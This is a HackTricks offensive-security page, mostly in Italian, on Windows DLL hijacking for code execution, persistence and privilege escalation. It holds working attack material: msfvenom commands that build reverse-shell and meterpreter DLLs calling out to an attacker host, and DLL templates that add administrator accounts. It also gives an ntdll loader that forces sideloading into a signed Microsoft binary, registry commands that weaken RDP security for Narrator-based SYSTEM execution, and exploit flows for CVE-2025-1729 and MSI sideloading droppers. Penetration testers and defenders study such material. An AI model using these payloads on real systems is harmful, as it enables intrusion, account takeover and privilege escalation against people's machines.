# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informazioni di base

DLL Hijacking comporta la manipolazione di un'applicazione affidabile affinché carichi una DLL dannosa. Questo termine comprende diverse tattiche come **DLL Spoofing, Injection, and Side-Loading**. Viene utilizzato principalmente per l'esecuzione di codice, per ottenere persistenza e, meno comunemente, per l'escalation di privilegi. Nonostante qui l'attenzione sia sull'escalation, il metodo di hijacking rimane lo stesso per tutti gli obiettivi.

### Tecniche comuni

Diverse metodologie vengono impiegate per il DLL hijacking, ognuna con la sua efficacia a seconda della strategia di caricamento delle DLL dell'applicazione:

1. **DLL Replacement**: Sostituire una DLL genuina con una malevola, eventualmente usando DLL Proxying per preservare la funzionalità originale della DLL.
2. **DLL Search Order Hijacking**: Posizionare la DLL malevola in un percorso di ricerca che venga consultato prima di quello legittimo, sfruttando il pattern di ricerca dell'applicazione.
3. **Phantom DLL Hijacking**: Creare una DLL malevola per un'applicazione che prova a caricarla pensando si tratti di una DLL richiesta ma inesistente.
4. **DLL Redirection**: Modificare parametri di ricerca come %PATH% o file .exe.manifest / .exe.local per indirizzare l'applicazione verso la DLL malevola.
5. **WinSxS DLL Replacement**: Sostituire la DLL legittima con una controparte malevola nella directory WinSxS, un metodo spesso associato al DLL side-loading.
6. **Relative Path DLL Hijacking**: Posizionare la DLL malevola in una directory controllata dall'utente insieme all'applicazione copiata, somigliante alle tecniche di Binary Proxy Execution.

> [!TIP]
> Per una chain passo-passo che stratifica HTML staging, configurazioni AES-CTR e implant .NET sopra il DLL sideloading, rivedi il workflow qui sotto.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Trovare DLL mancanti

Il modo più comune per trovare DLL mancanti in un sistema è eseguire [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) da sysinternals, **impostando** i **seguenti 2 filtri**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

e mostrare solo la **Attività del File System**:

![](<../../../images/image (153).png>)

Se cerchi **DLL mancanti in generale** lascia questo in esecuzione per alcuni **secondi**.\
Se cerchi una **DLL mancante all'interno di un eseguibile specifico** dovresti impostare **un altro filtro come "Process Name" "contains" `<exec name>`, eseguirlo e interrompere la cattura degli eventi**.

## Sfruttare DLL mancanti

Per escalare privilegi, la nostra migliore possibilità è essere in grado di **scrivere una DLL che un processo privilegiato proverà a caricare** in uno dei **percorsi in cui verrà cercata**. Pertanto, potremo **scrivere** una DLL in una **cartella** dove la **DLL viene cercata prima** della cartella contenente la **DLL originale** (caso particolare), oppure potremo scrivere in una **cartella dove la DLL verrà cercata** e la DLL originale **non esiste** in nessuna cartella.

### Ordine di ricerca delle DLL

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Le applicazioni Windows cercano le DLL seguendo una serie di percorsi di ricerca predefiniti, rispettando una sequenza particolare. Il problema del DLL hijacking sorge quando una DLL dannosa è posizionata strategicamente in una di queste directory, garantendo che venga caricata prima della DLL autentica. Una soluzione per prevenire ciò è assicurarsi che l'applicazione utilizzi percorsi assoluti quando fa riferimento alle DLL richieste.

Puoi vedere l'**ordine di ricerca delle DLL sui sistemi a 32-bit** qui sotto:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Questo è l'ordine di ricerca **di default** con **SafeDllSearchMode** abilitato. Quando è disabilitato la directory corrente sale al secondo posto. Per disabilitare questa funzione, crea il valore di registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e impostalo a 0 (il valore di default è abilitato).

Se la funzione [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) viene chiamata con **LOAD_WITH_ALTERED_SEARCH_PATH** la ricerca inizia nella directory del modulo eseguibile che **LoadLibraryEx** sta caricando.

Infine, nota che **una DLL potrebbe essere caricata indicando il percorso assoluto invece che solo il nome**. In tal caso quella DLL verrà **cercata solo in quel percorso** (se la DLL ha dipendenze, queste verranno cercate come appena caricate per nome).

Ci sono altri modi per alterare l'ordine di ricerca ma non li spiegherò qui.

### Forzare il sideloading tramite RTL_USER_PROCESS_PARAMETERS.DllPath

Un modo avanzato per influenzare in modo deterministico il percorso di ricerca delle DLL di un nuovo processo creato è impostare il campo DllPath in RTL_USER_PROCESS_PARAMETERS quando si crea il processo con le API native di ntdll. Fornendo qui una directory controllata dall'attaccante, un processo target che risolve una DLL importata solo per nome (nessun percorso assoluto e senza flag di caricamento sicuro) può essere costretto a caricare una DLL malevola da quella directory.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Notes/limitations
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Esempio di utilizzo operativo
- Posiziona una xmllite.dll malevola (esportando le funzioni richieste o facendo da proxy per quella reale) nella directory DllPath.
- Avvia un binario firmato noto per cercare xmllite.dll per nome usando la tecnica sopra descritta. Il loader risolve l'import tramite il DllPath fornito e sideloads la tua DLL.

Questa tecnica è stata osservata in-the-wild per innescare catene di multi-stage sideloading: un launcher iniziale deposita una helper DLL, che poi avvia un binario firmato Microsoft, hijackable, con un DllPath personalizzato per forzare il caricamento della DLL dell'attaccante da una staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Sì, i requisiti sono complicati da trovare dato che **per impostazione predefinita è piuttosto raro trovare un eseguibile privilegiato che manca di una DLL** ed è ancora **più raro avere permessi di scrittura su una cartella del system path** (di default non è possibile). Tuttavia, in ambienti mal configurati questo può accadere.\
Nel caso tu sia fortunato e soddisfi i requisiti, puoi dare un'occhiata al progetto [UACME](https://github.com/hfiref0x/UACME). Anche se **l'obiettivo principale del progetto è bypassare UAC**, potresti trovare lì una **PoC** di Dll hijacking per la versione di Windows che puoi utilizzare (probabilmente cambiando solo il percorso della cartella in cui hai write permissions).

Nota che puoi **controllare i tuoi permessi in una cartella** facendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **controlla i permessi di tutte le cartelle all'interno di PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Puoi anche controllare le importazioni di un eseguibile e le esportazioni di una dll con:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Per una guida completa su come **abusare Dll Hijacking per escalare i privilegi** con permessi di scrittura in una **System Path folder** controlla:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Strumenti automatici

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) controllerà se hai permessi di scrittura su qualsiasi cartella all'interno di system PATH.\
Altri tool automatizzati interessanti per scoprire questa vulnerabilità sono le **funzioni di PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll_.

### Esempio

Nel caso in cui trovi uno scenario sfruttabile, una delle cose più importanti per poterlo sfruttare con successo è **creare una dll che esporti almeno tutte le funzioni che l'eseguibile importerà da essa**. Nota comunque che Dll Hijacking è utile per [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o da [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system). Puoi trovare un esempio di **come creare una dll valida** in questo studio su dll hijacking focalizzato sull'esecuzione: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
Inoltre, nella **sezione successiva** puoi trovare alcuni **codici dll di base** che potrebbero essere utili come **template** o per creare una **dll con funzioni non richieste esportate**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Fondamentalmente un **Dll proxy** è una Dll in grado di **eseguire il tuo codice malevolo quando viene caricata** ma anche di **esporre** e **funzionare** come previsto **inoltrando tutte le chiamate alla libreria reale**.

Con lo strumento [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puoi effettivamente **indicare un eseguibile e selezionare la libreria** che vuoi proxify e **generare una proxified dll** oppure **indicare la Dll** e **generare una proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Ottieni un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crea un utente (x86 non ho visto una versione x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
Nota che in diversi casi la Dll che compili deve **esportare diverse funzioni** che verranno caricate dal processo vittima; se queste funzioni non esistono il **binary non sarà in grado di caricarle** e l'**exploit fallirà**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Esempio di DLL C++ con creazione utente</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternativa con thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Caso di studio: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe continua a cercare una DLL di localizzazione prevedibile e specifica per lingua all'avvio che può essere hijacked per arbitrary code execution e persistence.

Fatti chiave
- Percorso di probe (build correnti): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Percorso legacy (build precedenti): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Se una DLL scrivibile controllata dall'attaccante esiste nel percorso OneCore, viene caricata e `DllMain(DLL_PROCESS_ATTACH)` viene eseguita. Non sono richieste esportazioni.

Individuazione con Procmon
- Filtro: `Process Name is Narrator.exe` e `Operation is Load Image` o `CreateFile`.
- Avvia Narrator e osserva il tentativo di caricamento del percorso sopra.

DLL minima
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. Per restare silenziosi, al momento dell'attach enumera i thread di Narrator, apri il thread principale (`OpenThread(THREAD_SUSPEND_RESUME)`) e `SuspendThread` su di esso; continua nel tuo thread. Vedi PoC per il codice completo.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con quanto sopra, l'avvio di Narrator carica la DLL piantata. Sulla secure desktop (schermata di logon), premere CTRL+WIN+ENTER per avviare Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Abilitare classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Effettua RDP verso l'host; sulla schermata di logon premi CTRL+WIN+ENTER per lanciare Narrator; la tua DLL viene eseguita come SYSTEM sulla secure desktop.
- L'esecuzione si interrompe quando la sessione RDP viene chiusa—inietta/migra rapidamente.

Bring Your Own Accessibility (BYOA)
- Puoi clonare una voce di registro di un Accessibility Tool (AT) built-in (es. CursorIndicator), modificarla per puntare a un eseguibile/DLL arbitrario, importarla e poi impostare `configuration` su quel nome AT. Questo fa da proxy per esecuzione arbitraria sotto il framework Accessibility.

Notes
- Scrivere sotto `%windir%\System32` e modificare valori HKLM richiede diritti admin.
- Tutta la logica del payload può risiedere in `DLL_PROCESS_ATTACH`; non sono necessarie export.

## Caso di studio: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Questo caso dimostra Phantom DLL Hijacking in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracciato come **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` viene eseguito giornalmente alle 09:30 sotto il contesto dell'utente loggato.
- **Directory Permissions**: Scrivibile da `CREATOR OWNER`, permettendo a utenti locali di depositare file arbitrari.
- **DLL Search Behavior**: Tenta di caricare `hostfxr.dll` dalla working directory e registra "NAME NOT FOUND" se assente, indicando precedenza alla ricerca nella directory locale.

### Implementazione dell'exploit

Un attaccante può posizionare uno stub malevolo `hostfxr.dll` nella stessa directory, sfruttando la DLL mancante per ottenere esecuzione di codice nel contesto dell'utente:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Flusso d'attacco

1. Come utente standard, posizionare `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendere che l'attività pianificata venga eseguita alle 9:30 nel contesto dell'utente corrente.
3. Se un amministratore è connesso quando l'attività viene eseguita, la DLL dannosa viene eseguita nella sessione dell'amministratore con integrità media.
4. Eseguire tecniche standard di UAC bypass per elevare dall'integrità media ai privilegi SYSTEM.

## Caso di studio: MSI CustomAction Dropper + DLL Side-Loading tramite Signed Host (wsc_proxy.exe)

Gli attori della minaccia spesso abbinano dropper basati su MSI con DLL side-loading per eseguire payload sotto un processo fidato e firmato.

Panoramica della catena
- L'utente scarica l'MSI. Una CustomAction viene eseguita silenziosamente durante l'installazione GUI (es., LaunchApplication o un'azione VBScript), ricostruendo la fase successiva dalle risorse incorporate.
- Il dropper scrive un EXE legittimo firmato e una DLL dannosa nella stessa directory (esempio: wsc_proxy.exe firmato da Avast + wsc.dll controllata dall'attaccante).
- Quando l'EXE firmato viene avviato, l'ordine di ricerca DLL di Windows carica wsc.dll dalla directory di lavoro per prima, eseguendo il codice dell'attaccante sotto un processo genitore firmato (ATT&CK T1574.001).

MSI analysis (what to look for)
- Tabella CustomAction:
- Cercare voci che eseguono eseguibili o VBScript. Esempio di pattern sospetto: LaunchApplication che esegue un file incorporato in background.
- In Orca (Microsoft Orca.exe), ispezionare le tabelle CustomAction, InstallExecuteSequence e Binary.
- Payload incorporati/divisi nel CAB dell'MSI:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Cercare più piccoli frammenti che vengono concatenati e decrittografati da una CustomAction VBScript. Flusso comune:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Sideloading pratico con wsc_proxy.exe
- Posiziona questi due file nella stessa cartella:
- wsc_proxy.exe: host legittimo firmato (Avast). Il processo tenta di caricare wsc.dll per nome dalla sua directory.
- wsc.dll: DLL dell'attaccante. Se non sono richiesti export specifici, DllMain può essere sufficiente; altrimenti, costruisci una proxy DLL e inoltra gli export richiesti alla libreria genuina mentre esegui il payload in DllMain.
- Costruisci un payload DLL minimale:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Per i requisiti di export, usa un framework di proxying (es., DLLirant/Spartacus) per generare una DLL di forwarding che esegua anche il tuo payload.

- Questa tecnica si basa sulla risoluzione del nome della DLL da parte dell'host binary. Se l'host usa percorsi assoluti o flag di safe loading (es., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), l'hijack potrebbe fallire.
- KnownDLLs, SxS, e forwarded exports possono influenzare la precedenza e devono essere considerati durante la selezione dell'host binary e del set di export.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
